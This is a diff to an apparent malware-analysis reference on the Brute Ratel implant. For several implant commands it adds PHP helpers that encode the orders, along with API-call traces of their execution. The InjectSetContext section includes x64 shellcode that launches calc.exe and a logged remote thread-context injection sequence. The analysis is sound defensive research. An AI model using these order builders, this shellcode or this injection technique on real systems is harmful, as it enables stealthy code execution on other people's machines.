@@ -1214,100 +1214,316 @@ function GetCredentialsFromUiPrompt($CaptionText)
 # GetThreadsInfo  
 
 ```php
-
+/*
+	$p1 = "$pid" | "all"
+	$p2 = "alertable" OPTIONAL
+ex: GetThreadsInfo("2432");
+*/
+function GetThreadsInfo($pid)
+{
+	$cmd_id = "\xe4\xcd $pid";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
 **I. Fetching the order**  
 
 ```html
-
+[CNT] [327]
+[PTP] [0x8a8] [0x8d4] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000E85E1AEA50
+[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+IcalSNMyDwL28Gv2Ui1u9VBz"
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x000000E85E1BC530
+[PAR] DWORD   *pcbBinary : 0x000000E86002E78C
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0xe85feebea1]
 ```
 
 **II. Execution**   
 
 ```html
-
+[CNT] [342]
+[PTP] [0x8a8] [0x8d4] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtQuerySystemInformation> in [ntdll.dll] 
+[PAR] SYSTEM_INFORMATION_CLASS SystemInformationClass  : 0x5 (SystemProcessInformation)
+[PAR] PVOID                    SystemInformation       : 0x000000E85E1C6FC0
+[PAR] ULONG                    SystemInformationLength : 0xa090
+[PAR] PULONG                   ReturnLength            : 0x000000E86002E604
+[RET] [0xe85ff04f0d]
 ```
 
 **III. Result**   
 
 ```html
-
+[CNT] [435]
+[PTP] [0x8a8] [0x8d4] [c:\windows\system32\rundll32.exe]
+[API] <CryptBinaryToStringW> in [crypt32.dll] 
+[PAR] BYTE*  pbBinary   : 0x000000E85E1B6480
+[STR]        -> "E4CD"
+[STR]           "2432 calc.exe|2640 00007FF65BB7AF90 5 13|1928 00007FFCBFF528C0 5 6|1376 00007FF65BB54680 5 6|1644 00007FFCC1994A30 5 6|"
+[PAR] DWORD  cbBinary   : 0xfa
+[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
+[PAR] LPWSTR pszString  : 0x000000E85E1BB310
+[PAR] DWORD* pcchString : 0x000000E86002E5AC
+[RET] [0xe85feee028]
 ```
 
 <a id="InjectSetContext"></a>
 # InjectSetContext  
 
-```php
+The optionnal 'rdll' parameter indicates that the last parameter is an encrypted DLL  
+If the last parameter is a PE, the first bytes of it's header will be wiped after beeing loaded into memory  
+This function is likely to be used after identifying an alertable thread in the targeted process through the previous command 'GetThreadsInfo'  
 
+```php
+/*
+	$p1 = "pid"
+	$p2 = "tid"
+	$p3 = "rdll" OPTIONAL
+	$p4 = base64(PE|shellcode)
+*/
+function InjectSetContext($pid, $tid)
+{
+	$buf =  "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d";
+	$buf =  $buf . "\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01";
+	$buf =  $buf . "\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01";
+	$buf =  $buf . "\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31";
+	$buf =  $buf . "\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45";
+	$buf =  $buf . "\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b";
+	$buf =  $buf . "\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31";
+	$buf =  $buf . "\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2";
+	$buf =  $buf . "\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";
+	
+	$buff_b64 = base64_encode($buf);
+	
+	$cmd_id = "\xba\xe1 $pid $tid lol $buff_b64";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
 **I. Fetching the order**  
 
 ```html
-
+[CNT] [775]
+[PTP] [0x630] [0x36c] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x0000001E0D97D5D0
+[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Yf7QSNMMNUv1/hezM1lutnoJTikJot/wF6vWByQlN4OMYy7RvKpua5vGXO+ee5uAOI4mz4K+SuA0UsuUJe/2dbYrFYYMTiGu"
+[STR]            "w0xRlFAfkwSMZAMINnZUh1AeC7fv1OEKkNNWwk2yyz/lq8GKQyoB2N1ppBEZsX+qA0M7wJYxbPVK1ndHqPEZ56YN2X3uzVMPE5iVxR+ptXHavFvkwqufJIdi"
+[STR]            "STCHAPa1o6o6KtQr2SE6sa3lo4dNMXf3HmxqxbiJuJydJqsALE7OBdv9x5YtT4TMIbjlvOuk2yHZqbXlLWA+6JMugpJqmp+q49kv3I13a2wRRG3b7uNW+8DA"
+[STR]            "ibtKJSCrXpcKQ/EY3p/VU3Ad9csCqvenpWnaQue0lG8bUF1Bj8d9XJZleJv4U3+Hk4ltoPBu+ubDRHXLwu1OJPJzWAF3z4GW47qXAvgPFtkEQCkWL5P4RwGi"
+[STR]            "3NlOk6Ib"
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x0000001E0D9753B0
+[PAR] DWORD   *pcbBinary : 0x0000001E0F93EACC
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0x1e0f89bea1]
 ```
 
 **II. Execution**   
 
 ```html
+[CNT] [787]
+[PTP] [0x630] [0x36c] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenProcess> in [ntdll.dll] 
+[PAR] PHANDLE             ProcessHandle    : 0x0000001E0F93E960
+[PAR] ACCESS_MASK         DesiredAccess    : 0x28 (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)
+[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x0000001E0F93E9B0
+[PAR] PCLIENT_ID          ClientId         : 0x0000001E0F93E970
+[FLD]                    -> UniqueProcess = 0x7b8
+[FLD]                    -> UniqueThread  = 0x0
+[RET] [0x1e0f8b4aab]
 
+[CNT] [798]
+[PTP] [0x630] [0x36c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAllocEx> in [KERNEL32.DLL] 
+[PAR] HANDLE hProcess         : 0x324
+[PAR] LPVOID lpAddress        : 0x0
+[PAR] SIZE_T dwSize           : 0xaa
+[PAR] DWORD  flAllocationType : 0x3000
+[PAR] DWORD  flProtect        : 0x4 (PAGE_READWRITE)
+[RET] [0x1e0f886395]
+
+[CNT] [799]
+[PTP] [0x630] [0x36c] [c:\windows\system32\rundll32.exe]
+[API] <WriteProcessMemory> in [KERNEL32.DLL] 
+[PAR] HANDLE  hProcess      : 0x324
+[PAR] LPVOID  lpBaseAddress : 0x2de0000
+[PAR] LPCVOID lpBuffer      : 0x0000001E0D9754B0
+[PAR] SIZE_T  nSize         : 0xa9
+[RET] [0x1e0f8863bd]
+
+[CNT] [800]
+[PTP] [0x630] [0x36c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualProtectEx> in [KERNEL32.DLL] 
+[PAR] HANDLE hProcess     : 0x324
+[PAR] LPVOID lpAddress    : 0x2de0000
+[PAR] SIZE_T dwSize       : 0xaa
+[PAR] DWORD  flNewProtect : 0x20 (PAGE_EXECUTE_READ)
+[RET] [0x1e0f8863e4]
+
+[CNT] [801]
+[PTP] [0x630] [0x36c] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtGetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle  : 0x32c
+[PAR] PCONTEXT ThreadContext : 0x0000001E0D95D990
+[RET] [0x1e0f8a6017]
+
+[CNT] [810]
+[PTP] [0x630] [0x36c] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtSetContextThread> in [ntdll.dll] 
+[PAR] HANDLE   ThreadHandle : 0x32c
+[PAR] PCONTEXT Context      : 0x0000001E0D95D990
+[FLD]          -> ContextFlags = 0x10000b (CONTEXT_CONTROL | CONTEXT_INTEGER)
+[FLD]          -> Rip          = 0x2de0000 
+[FLD]          -> Rsp          = 0x00000000053BF898
+[FLD]          -> Rbx          = 0x0000000000000002
+[FLD]          -> Rcx          = 0x00007FFF8AF711FA
+[FLD]          -> Rdi          = 0x0000000000000002
+[FLD]          -> R8           = 0x00000000053BF898
+[FLD]          -> R9           = 0x00000000053BFCC0
+[FLD]          -> R11          = 0x0000000000000246
+[FLD]          -> R12          = 0x0000000000000008
+[FLD]          -> R13          = 0x00000000053BFC00
+[RET] [0x1e0f8a6098]
 ```
 
 **III. Result**   
 
 ```html
-
+[CNT] [818]
+[PTP] [0x630] [0x36c] [c:\windows\system32\rundll32.exe]
+[API] <CryptBinaryToStringW> in [crypt32.dll] 
+[PAR] BYTE*  pbBinary   : 0x0000001E0D966220
+[STR]        -> "BAE1"
+[STR]           "1976 1108 32C 00007FFF8AF711FA 0000000002DE0000 0"
+[PAR] DWORD  cbBinary   : 0x6e
+[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
+[PAR] LPWSTR pszString  : 0x0000001E0D979A20
+[PAR] DWORD* pcchString : 0x0000001E0F93E81C
+[RET] [0x1e0f89e028]
 ```
 
 <a id="connect_localhost_global_struct"></a>
 # connect_localhost_global_struct  
 
+TODO  
+
 ```php
-
+/*
+	connect_localhost_global_struct("0");
+*/
+function connect_localhost_global_struct($index)
+{
+	$cmd_id = "\xed\xf2 $index";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
-**I. Fetching the order**  
-
-```html
-
-```
-
-**II. Execution**   
-
-```html
-
-```
-
-**III. Result**   
-
-```html
-
-```
 
 <a id="WriteMemory"></a>
 # WriteMemory  
 
-```php
+Writes given data to a specified address in memory, likely used for hooking or patching DLL  
 
+```php
+/*
+	ex: WriteMemory("180000000", "48454c4c4f");
+*/
+function WriteMemory($address, $data)
+{
+	$cmd_id = "\xd8\x3b $address $data";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
 **I. Fetching the order**  
 
 ```html
-
+[CNT] [393]
+[PTP] [0xaa0] [0x8d8] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x0000008159EFA750
+[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Js/mSNMMOQ/20xe8M0lu9XoKZ2slpciUHJTsOT0OOM70BQXImqZPcZeBV/T2dtuQNJIptA=="
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x0000008159F00D80
+[PAR] DWORD   *pcbBinary : 0x000000815BEFE5DC
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0x815be5bea1]
 ```
 
 **II. Execution**   
 
 ```html
+[CNT] [403]
+[PTP] [0xaa0] [0x8d8] [c:\windows\system32\rundll32.exe]
+[API] <VirtualQuery> in [KERNEL32.DLL] 
+[PAR] LPCVOID                   lpAddress : 0x0000000180000000
+[PAR] PMEMORY_BASIC_INFORMATION lpBuffer  : 0x000000815BEFE4C0
+[PAR] SIZE_T                    dwLength  : 0x30
+[RET] [0x815be64bb2]
 
+[CNT] [404]
+[PTP] [0xaa0] [0x8d8] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000815BEFE4B0
+[FLD]        -> BaseAddress = 0x0000000180000000 (x64_stealth.dll)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000815BEFE4B8 (0x5)
+[PAR] ULONG  NewAccessProtection    : 0x4 (PAGE_READWRITE)
+[RET] [0x815be74c5c]
+
+[CNT] [405]
+[PTP] [0xaa0] [0x8d8] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtProtectVirtualMemory> in [ntdll.dll] 
+[PAR] HANDLE ProcessHandle          : 0xFFFFFFFFFFFFFFFF
+[PAR] PVOID  *BaseAddress           : 0x000000815BEFE4B0
+[FLD]        -> BaseAddress = 0x0000000180000000 (x64_stealth.dll)
+[PAR] PULONG NumberOfBytesToProtect : 0x000000815BEFE4B8 (0x1000)
+[PAR] ULONG  NewAccessProtection    : 0x2 (PAGE_READONLY)
+[RET] [0x815be74c5c]
 ```
 
 **III. Result**   
 
-```html
+<p><a href="https://cedricg-mirror.github.io/docs/assets/images/bruteratel/WriteMemory.jpg">
+<img src="/docs/assets/images/bruteratel/WriteMemory.jpg" alt="Writing HELLO to DLL Header">
+</a></p>
 
+```html
+[CNT] [415]
+[PTP] [0xaa0] [0x8d8] [c:\windows\system32\rundll32.exe]
+[API] <CryptBinaryToStringW> in [crypt32.dll] 
+[PAR] BYTE*  pbBinary   : 0x0000008159F03470
+[STR]        -> "D83B"
+[STR]           "0000000180000000"
+[PAR] DWORD  cbBinary   : 0x2a
+[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
+[PAR] LPWSTR pszString  : 0x0000008159F058E0
+[PAR] DWORD* pcchString : 0x000000815BEFE3CC
+[RET] [0x815be5e028]
 ```
 
 <a id="GetUsersPwdHashes"></a>
